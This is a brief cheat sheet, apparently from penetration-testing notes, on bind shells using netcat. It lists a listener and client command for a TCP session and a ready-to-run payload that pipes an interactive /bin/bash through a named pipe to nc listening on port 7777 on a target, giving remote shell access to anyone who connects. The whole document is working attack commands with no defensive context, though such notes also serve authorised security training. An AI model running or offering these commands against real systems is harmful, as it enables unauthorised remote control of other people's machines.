# Bind Shells

Bind TCP Session :

On the target : nc -lvnp 7777
On the Client : nc -nv $TARGET 7777

Bind Shell :

Payload on the Target : rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 7777 > /tmp/f
On the Client : nc -nv $TARGET 7777